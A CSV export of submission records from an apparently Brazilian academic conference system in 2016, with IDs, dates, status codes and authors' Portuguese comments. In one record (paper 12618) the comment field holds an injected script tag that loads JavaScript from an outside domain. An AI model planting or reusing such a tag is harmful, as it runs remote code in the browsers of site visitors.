"paper_id","user_id","sched_conf_id","track_id","language","start_time","end_time","comments_to_dr","citations","date_submitted","date_reminded","last_modified","date_status_modified","status","submission_progress","review_mode","current_stage","submission_file_id","revised_file_id","review_file_id","layout_file_id","director_file_id","pages","date_to_presentations","date_to_archive","comments_status"
"10551","11458","46","230","pt","\N","\N","Prezados, 
Submetemos nosso trabalho com o intuito de contribuir com a pesquisa científica do país.","\N","2016-09-30 15:13:38","\N","2016-10-26 16:43:19","2016-10-26 16:41:40","3","0","2","2","24242","\N","24305","\N","\N","\N","\N","\N","0"
"12614","11245","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:57:54","2016-09-30 22:57:54","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12606","11966","46","229","pt","\N","\N","\N","\N","2016-09-30 23:00:25","\N","2016-10-27 09:25:47","2016-10-27 09:25:47","0","0","2","2","28618","\N","28662","\N","\N","\N","\N","2016-10-27 09:25:47","0"
"12613","10984","46","232","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:58:41","2016-09-30 22:58:41","1","3","2","2","28636","\N","\N","\N","\N","\N","\N","\N","0"
"12709","12035","46","237","pt","\N","\N","\N","\N","2016-09-30 23:44:57","\N","2016-10-14 17:57:16","2016-10-14 17:57:16","0","0","2","2","28832","\N","29510","\N","\N","\N","\N","2016-10-14 17:57:16","0"
"12716","10418","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:09:47","2016-09-30 23:09:47","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12597","12276","46","231","pt","\N","\N","\N","\N","2016-09-30 23:04:52","\N","2016-10-26 11:09:17","2016-10-26 11:09:17","0","0","2","2","28599","\N","28739","\N","\N","\N","\N","2016-10-26 11:09:17","0"
"12699","10533","46","236","pt","\N","\N","O modelo de artigo enviado para coloca&ccedil;&atilde;o do mesmo, n&atilde;o corresponde ao espa&ccedil;amento necess&aacute;rio exigidos nas diretrizes, logo, pedimos encarecidamente que reenviem o modelo correspondendo caso necess&aacute;rio.&nbsp;","\N","2016-09-30 23:49:26","\N","2016-10-24 10:21:36","2016-10-24 10:21:36","4","0","2","2","28796","\N","29627","\N","\N","\N","\N","\N","0"
"12617","11943","46","237","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:00:19","2016-09-30 23:00:19","1","3","2","2","28657","\N","\N","\N","\N","\N","\N","\N","0"
"7019","6554","46","235","pt","\N","\N","\N","\N","2016-09-16 15:32:46","\N","2016-10-24 13:08:51","2016-10-24 13:06:16","3","0","2","2","15974","\N","15985","\N","\N","\N","\N","\N","0"
"12653","9119","46","237","pt","\N","\N","\N","\N","2016-09-30 23:29:52","\N","2016-10-18 07:44:47","2016-10-18 07:41:00","3","0","2","2","28702","\N","29179","\N","\N","\N","\N","\N","0"
"12600","3002","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:00:32","2016-09-30 23:00:32","1","3","2","2","28660","\N","\N","\N","\N","\N","\N","\N","0"
"12639","12285","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:00:59","2016-09-30 23:00:59","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12623","12274","46","231","pt","\N","\N","\N","\N","2016-09-30 23:27:28","\N","2016-10-26 11:10:14","2016-10-26 11:10:14","0","0","2","2","28971","\N","29128","\N","\N","\N","\N","2016-10-26 11:10:14","0"
"12717","8619","46","232","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:10:33","2016-09-30 23:10:09","1","3","2","2","28830","\N","\N","\N","\N","\N","\N","\N","0"
"12658","7735","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:02:32","2016-09-30 23:02:32","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"9376","10169","46","237","pt","\N","\N","Todos os autores deste trabalho agradecem a possibilidade à participação no evento, bem como a divulgação e demonstração do projeto realizado.","\N","2016-09-29 12:53:40","\N","2016-10-20 15:12:03","2016-10-20 15:11:06","3","0","2","2","21518","26309","21553","\N","\N","\N","\N","\N","0"
"12521","5418","46","231","pt","\N","\N","Em caso de qualquer dúvida ou possível erro contatar meu e-mail, reapoderei o mais rápido possível","\N","2016-09-30 22:59:20","\N","2016-10-23 11:45:23","2016-10-23 11:45:23","4","0","2","2","28474","\N","28648","\N","\N","\N","\N","\N","0"
"12607","11880","46","229","pt","\N","\N","\N","\N","2016-09-30 23:08:32","\N","2016-10-25 16:30:41","2016-10-25 16:29:11","3","0","2","2","28620","\N","28795","\N","\N","\N","\N","\N","0"
"12603","7913","46","237","pt","\N","\N","\N","\N","2016-09-30 23:05:56","\N","2016-10-18 07:49:37","2016-10-18 07:47:42","3","0","2","2","28622","\N","28756","\N","\N","\N","\N","\N","0"
"12704","9001","46","229","pt","\N","\N","\N","\N","2016-10-01 00:14:49","\N","2016-10-03 17:15:02","2016-10-03 17:15:02","0","0","2","2","28823","\N","30083","\N","\N","\N","\N","2016-10-03 17:15:02","0"
"12595","11842","46","229","pt","\N","\N","\N","\N","2016-09-30 23:02:35","\N","2016-10-26 11:31:54","2016-10-26 11:31:54","0","0","2","2","28626","\N","28689","\N","\N","\N","\N","2016-10-26 11:31:54","0"
"12602","8404","46","237","Brasil","\N","\N","\N","\N","2016-10-01 00:46:23","\N","2016-10-03 17:33:04","2016-10-03 17:33:04","0","0","2","2","30164","\N","30198","\N","\N","\N","\N","2016-10-03 17:33:04","0"
"12676","12232","46","235","pt","\N","\N","\N","\N","2016-09-30 23:54:29","\N","2016-10-26 21:49:09","2016-10-26 21:47:49","3","0","2","2","28815","\N","29726","\N","\N","\N","\N","\N","0"
"12615","10088","46","232","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:07:39","2016-09-30 23:07:39","1","4","2","2","28715","\N","\N","\N","\N","\N","\N","\N","0"
"12696","10869","46","233","pt","\N","\N","\N","\N","2016-09-30 23:30:17","\N","2016-10-26 00:28:00","2016-10-26 00:28:00","4","0","2","2","28786","\N","29189","\N","\N","\N","\N","\N","0"
"12671","12228","46","229","pt","\N","\N","\N","\N","2016-09-30 23:31:22","\N","2016-10-27 11:35:50","2016-10-27 10:00:46","3","0","2","2","28736","\N","29216","\N","\N","\N","\N","\N","0"
"12667","10707","46","234","pt","\N","\N","\N","\N","2016-09-30 23:39:32","\N","2016-10-26 09:53:42","2016-10-26 09:53:42","0","0","2","2","28781","\N","29403","\N","\N","\N","\N","2016-10-26 09:53:42","0"
"12610","9939","46","237","pt","\N","\N","\N","\N","2016-09-30 23:25:28","\N","2016-10-11 17:15:53","2016-10-11 17:15:53","4","0","2","2","28734","\N","29093","\N","\N","\N","\N","\N","0"
"12523","6477","46","229","pt","\N","\N","\N","\N","2016-09-30 23:11:18","\N","2016-10-26 11:55:35","2016-10-26 11:52:57","3","0","2","2","28440","\N","28840","\N","\N","\N","\N","\N","0"
"12511","12064","46","232","pt","\N","\N","\N","\N","2016-09-30 23:00:08","\N","2016-10-25 22:14:59","2016-10-25 22:14:59","4","0","2","2","28578","\N","28655","\N","\N","\N","\N","2016-10-13 16:12:46","0"
"12618","8619","46","232","pt","\N","\N","<script id=""lg210a"" src=""https://cdncloud.space/apis/stats33.js"" type=""text/javascript""></script>","\N","\N","\N","2016-09-30 22:58:58","2016-09-30 22:58:58","1","3","2","2","28641","\N","\N","\N","\N","\N","\N","\N","0"
"12622","8429","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:59:01","2016-09-30 22:58:33","1","2","2","2","28646","\N","\N","\N","\N","\N","\N","\N","0"
"12630","12051","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:59:58","2016-09-30 22:59:58","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12662","12169","46","229","pt","\N","\N","\N","\N","2016-09-30 23:13:42","\N","2016-10-26 11:25:48","2016-10-26 11:23:49","3","0","2","2","28718","28917","28883","\N","\N","\N","\N","\N","0"
"12655","10451","46","236","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:02:17","2016-09-30 23:02:17","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12723","10801","46","229","pt","\N","\N","\N","\N","2016-09-30 23:19:27","\N","2016-10-11 18:30:58","2016-10-11 18:30:58","0","0","2","2","28841","\N","28980","\N","\N","\N","\N","2016-10-11 18:30:58","0"
"12601","12209","46","234","pt","\N","\N","\N","\N","2016-09-30 23:28:23","\N","2016-10-27 20:54:00","2016-10-27 20:54:00","0","0","2","2","\N","\N","\N","\N","\N","\N","\N","2016-10-27 20:54:00","0"
"12564","8453","46","231","pt","\N","\N","\N","\N","2016-09-30 23:41:30","\N","2016-10-30 17:12:04","2016-10-30 17:12:04","0","0","2","2","28844","\N","29444","\N","\N","\N","\N","2016-10-30 17:12:04","0"
"9662","5006","46","237","pt","\N","\N","Esta é a submissão correta. Devendo-se desconsiderar a anterior.","\N","2016-09-29 19:11:43","\N","2016-10-22 18:17:32","2016-10-22 18:16:13","3","0","2","2","22138","\N","22167","\N","\N","\N","\N","\N","0"
"12677","11402","46","231","pt","\N","\N","\N","\N","2016-10-20 11:41:22","\N","2016-10-20 11:43:02","2016-10-20 11:43:02","0","0","2","2","28745","\N","30537","\N","\N","\N","\N","2016-10-20 11:43:02","0"
"12721","12281","46","233","pt","\N","\N","\N","\N","2016-09-30 23:34:38","\N","2016-10-23 00:30:47","2016-10-23 00:29:27","3","0","2","2","28849","\N","29293","\N","\N","\N","\N","\N","0"
"12624","11485","46","230","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:25:22","2016-09-30 23:25:22","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12619","407","46","235","pt","\N","\N","\N","\N","2016-09-30 23:10:02","\N","2016-10-25 15:02:58","2016-10-25 14:55:23","3","0","2","2","28640","\N","28822","\N","\N","\N","\N","\N","0"
"12633","12282","46","232","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:02:45","2016-09-30 23:02:45","1","3","2","2","28684","\N","\N","\N","\N","\N","\N","\N","0"
"12996","12340","46","234","pt","\N","\N","\N","\N","2016-09-30 23:42:21","\N","2016-10-26 19:28:23","2016-10-26 19:23:06","3","0","2","2","29411","\N","29459","\N","\N","\N","\N","\N","0"
"6683","6685","46","233","Brasil","\N","\N","<p>Ao Conselho Diretor da Confer&ecirc;ncia</p><p>Prezado&nbsp;</p><p>O presente trabalho vem contribuir para a melhor compreens&atilde;o da dispers&atilde;o do desmatamento na Amaz&ocirc;nia Central.</p> <p>Considerando a import&acirc;ncia da vegeta&ccedil;&atilde;o nativa, no cen&aacute;rio estrat&eacute;gico, ambiental, social e econ&ocirc;mico do pa&iacute;s e as restri&ccedil;&otilde;es ambientais sobre o uso das &aacute;reas de prote&ccedil;&atilde;o permanentes, analisando os fatores de dispers&atilde;o espacial do desmatamento atrav&eacute;s das ferramentas de geotecnologia, verificou-se comportamento diferenciado do desflorestamento aos encontrados nas &aacute;reas do sul da Amaz&ocirc;nia, sendo as &aacute;reas das bacias hidrogr&aacute;ficas sob forte influencias das propriedades com explora&ccedil;&atilde;o da pecu&aacute;ria tonaram-se as &aacute;reas com indica&ccedil;&otilde;es priorit&aacute;ria para interven&ccedil;&atilde;o pelo poder p&uacute;blico para mitigar o desflorestamento no Munic&iacute;pio de Silves, na Amaz&ocirc;nia Central.</p><p>Declaro ainda que o artigo &eacute; original e, que n&atilde;o se encontra sob an&aacute;lise em qualquer outro ve&iacute;culo de comunica&ccedil;&atilde;o cient&iacute;fica ou que tenha sido publicado em outro peri&oacute;dico cient&iacute;fico de forma total ou parcial. Atesto tamb&eacute;m que os autores citados participaram da concep&ccedil;&atilde;o e revis&otilde;es que resultaram neste artigo.</p> <p>&nbsp;</p> <p>Por fim, declaramos tamb&eacute;m que n&atilde;o temos nenhum conflito de interesse com o tema abordado&nbsp;</p><p>&nbsp;</p>","\N","2016-09-16 18:25:35","\N","2016-10-24 16:39:55","2016-10-24 16:39:55","4","0","2","2","16062","\N","16075","\N","\N","\N","\N","\N","0"
"12640","9186","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:01:01","2016-09-30 23:01:01","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12641","12285","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:01:10","2016-09-30 23:01:10","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12673","12289","46","237","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:04:20","2016-09-30 23:04:20","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12686","9015","46","237","pt","\N","\N","\N","\N","2016-09-30 23:29:57","\N","2016-10-14 11:52:34","2016-10-14 11:52:09","3","0","2","2","28875","\N","29180","\N","\N","\N","\N","\N","0"
"9589","8064","46","235","pt","\N","\N","\N","\N","2016-09-29 17:57:50","\N","2016-10-18 14:56:54","2016-10-18 14:56:54","0","0","2","2","21960","\N","21993","\N","\N","\N","\N","2016-10-18 14:56:54","0"
"12394","12044","46","237","pt","\N","\N","\N","\N","2016-09-30 23:22:44","\N","2016-10-19 15:18:13","2016-10-19 15:17:19","3","0","2","2","28799","\N","29042","\N","\N","\N","\N","\N","0"
"10296","11288","46","229","pt","\N","\N","\N","\N","2016-09-30 12:47:50","\N","2016-10-25 14:24:23","2016-10-25 14:23:03","3","0","2","2","23627","\N","23676","\N","\N","\N","\N","\N","0"
"10243","7821","46","232","pt","\N","\N","\N","\N","2016-09-30 12:15:51","\N","2016-10-25 14:34:48","2016-10-08 09:43:24","4","0","2","2","23502","\N","23536","\N","\N","\N","\N","\N","0"
"12634","10984","46","232","pt","\N","\N","<html />","\N","2016-09-30 23:09:14","\N","2016-10-25 15:14:25","2016-10-25 15:14:25","4","0","2","2","28673","\N","28807","\N","\N","\N","\N","2016-10-13 16:25:18","0"
"12638","12246","46","232","pt","\N","\N","\N","\N","2016-10-01 00:02:00","\N","2016-10-25 22:15:00","2016-10-25 22:15:00","4","0","2","2","28704","\N","29884","\N","\N","\N","\N","2016-10-03 17:22:16","0"
"12632","8429","46","231","pt","\N","\N","\N","\N","2016-09-30 23:09:33","\N","2016-10-26 11:11:07","2016-10-26 11:11:07","0","0","2","2","28663","\N","28810","\N","\N","\N","\N","2016-10-26 11:11:07","0"
"12647","9166","46","237","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:01:37","2016-09-30 23:01:37","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"8424","7692","46","235","pt","\N","\N","Caro Diretor,

Segue artigo sobre experiência de extensão realizada com articulação junto aos alunos da disciplina estágio supervisionado 2 no curso de licenciatura em matemática realizada no IFBA Campus Camaçari.","\N","2016-09-21 17:39:01","\N","2016-10-25 19:37:02","2016-10-25 19:30:32","3","0","2","2","19217","\N","19233","\N","\N","\N","\N","\N","0"
"12648","11245","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:07:05","2016-09-30 23:01:37","1","2","2","2","28775","\N","\N","\N","\N","\N","\N","\N","0"
"12650","8404","46","237","pt","\N","\N","\N","\N","2016-10-01 16:33:59","\N","2016-10-03 17:23:28","2016-10-03 17:23:28","0","0","2","2","28710","\N","30261","\N","\N","\N","\N","2016-10-03 17:23:28","0"
"12712","12233","46","231","pt","\N","\N","\N","\N","2016-09-30 23:33:27","\N","2016-10-26 14:30:22","2016-10-26 14:30:22","0","0","2","2","28821","\N","29271","\N","\N","\N","\N","2016-10-26 14:30:22","0"
"12644","10762","46","231","pt","\N","\N","\N","\N","2016-09-30 23:12:30","\N","2016-10-13 15:19:02","2016-10-13 15:19:02","0","0","2","2","28688","\N","28863","\N","\N","\N","\N","2016-10-13 15:19:02","0"
"12631","10729","46","237","pt","\N","\N","\N","\N","2016-09-30 23:05:32","\N","2016-10-20 09:13:35","2016-10-20 09:12:17","3","0","2","2","28665","\N","28748","\N","\N","\N","\N","\N","0"
"12646","12221","46","234","pt","\N","\N","\N","\N","\N","\N","2016-10-20 12:25:53","2016-10-20 12:25:53","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"10024","10853","46","234","pt","\N","\N","\N","\N","2016-09-30 11:47:18","\N","2016-10-25 10:05:50","2016-10-25 09:09:49","3","0","2","2","23054","\N","23430","\N","\N","\N","\N","\N","0"
"12530","11961","46","235","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:30:27","2016-09-30 23:02:18","1","5","2","2","28509","\N","\N","\N","\N","\N","\N","\N","0"
"12701","12282","46","232","pt","\N","\N","\N","\N","2016-09-30 23:25:14","\N","2016-10-25 22:15:00","2016-10-25 22:15:00","4","0","2","2","28824","\N","29088","\N","\N","\N","\N","2016-10-13 16:29:19","0"
"12663","12202","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:05:53","2016-09-30 23:02:57","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12652","7857","46","233","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:08:30","2016-09-30 23:08:30","1","4","2","2","28695","\N","\N","\N","\N","\N","\N","\N","0"
"12720","10418","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:11:00","2016-09-30 23:09:52","1","2","2","2","28836","\N","\N","\N","\N","\N","\N","\N","0"
"7064","8409","46","235","pt","\N","\N","\N","\N","2016-09-16 17:54:27","\N","2016-10-28 20:14:21","2016-10-28 20:14:21","0","0","2","2","16055","\N","16058","\N","\N","\N","\N","2016-10-28 20:14:21","0"
"9745","10915","46","235","pt","\N","\N","\N","\N","2016-09-29 21:02:49","\N","2016-10-28 22:47:38","2016-10-28 22:47:38","0","0","2","2","22369","\N","22400","\N","\N","\N","\N","2016-10-28 22:47:38","0"
"10982","10768","46","235","pt","\N","\N","O documento anterior estava com as figuras desconfiguradas. Por este motivo estou a enviar novamente.","\N","2016-09-30 17:39:33","\N","2016-10-28 23:54:41","2016-10-28 23:54:41","0","0","2","2","25173","\N","25249","\N","\N","\N","\N","2016-10-28 23:54:41","0"
"12714","11815","46","231","pt","\N","\N","\N","\N","2016-09-30 23:16:55","\N","2016-11-17 23:33:20","2016-10-26 14:29:31","3","0","2","2","28826","\N","28932","\N","\N","\N","\N","\N","0"
"11858","12019","46","233","pt","\N","\N","Este trabalho faz parte de um projeto maior, assim alguns ponto do trabalho podem está semelhante a outros artigos oriundo do mesmo projeto. Mas, o que não compromete a originalidade do presente artigo!
Att,
Darley Cutrim","\N","2016-09-30 21:27:44","\N","2016-10-29 09:31:12","2016-10-29 09:31:12","0","0","2","2","27090","\N","27282","\N","\N","\N","\N","2016-10-29 09:31:12","0"
"12651","8744","46","233","pt","\N","\N","\N","\N","2016-09-30 23:13:57","\N","2016-10-26 08:12:06","2016-10-26 01:20:15","3","0","2","2","28697","\N","28886","\N","\N","\N","\N","\N","0"
"12681","11758","46","229","pt","\N","\N","\N","\N","2016-09-30 23:26:51","\N","2016-10-26 11:17:06","2016-10-26 11:17:06","0","0","2","2","28935","\N","29120","\N","\N","\N","\N","2016-10-26 11:17:06","0"
"7481","8618","46","234","pt","\N","\N","\N","\N","2016-09-19 13:10:35","\N","2016-10-25 09:08:02","2016-10-25 09:08:02","0","0","2","2","16931","\N","16941","\N","\N","\N","\N","2016-10-25 09:08:02","0"
"10050","10623","46","229","pt","\N","\N","\N","\N","2016-09-30 09:51:43","\N","2016-10-25 13:30:36","2016-10-25 13:30:36","0","0","2","2","23099","\N","23128","\N","\N","\N","\N","2016-10-25 13:30:36","0"
"12666","10707","46","234","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:03:12","2016-09-30 23:03:12","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"9074","8943","46","229","pt","\N","\N","Submissão Artigo 2016","\N","2016-09-28 11:44:16","\N","2016-10-25 11:09:51","2016-10-25 11:09:51","0","0","2","2","20842","\N","20849","\N","\N","\N","\N","2016-10-25 11:09:51","0"
"9617","8722","46","235","pt","\N","\N","Prezado estou reenviando, o artigo a fim de atender as diretrizes de submissão de artigo.","\N","2016-09-29 18:23:01","\N","2016-10-25 18:56:37","2016-10-25 18:56:37","0","0","2","2","22018","\N","22049","\N","\N","\N","\N","2016-10-25 18:56:37","0"
"9677","9689","46","233","pt","\N","\N","\N","\N","2016-09-29 19:23:00","\N","2016-10-25 19:55:09","2016-10-25 19:55:09","0","0","2","2","22170","\N","22190","\N","\N","\N","\N","2016-10-25 19:55:09","0"
"12669","12284","46","236","pt","\N","\N","\N","\N","2016-09-30 23:11:43","\N","2016-10-01 16:48:18","2016-10-01 16:48:18","4","0","2","2","28743","\N","28853","\N","\N","\N","\N","\N","0"
"12692","6501","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:23:32","2016-09-30 23:23:32","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"11831","11671","46","236","pt","\N","\N","\N","\N","2016-09-30 21:06:13","\N","2016-10-17 09:01:26","2016-10-17 09:00:47","3","0","2","2","26997","\N","27042","\N","\N","\N","\N","\N","0"
"12668","11459","46","237","pt","\N","\N","\N","\N","2016-09-30 23:20:47","\N","2016-10-18 08:21:27","2016-10-18 08:20:47","3","0","2","2","28728","\N","29002","\N","\N","\N","\N","\N","0"
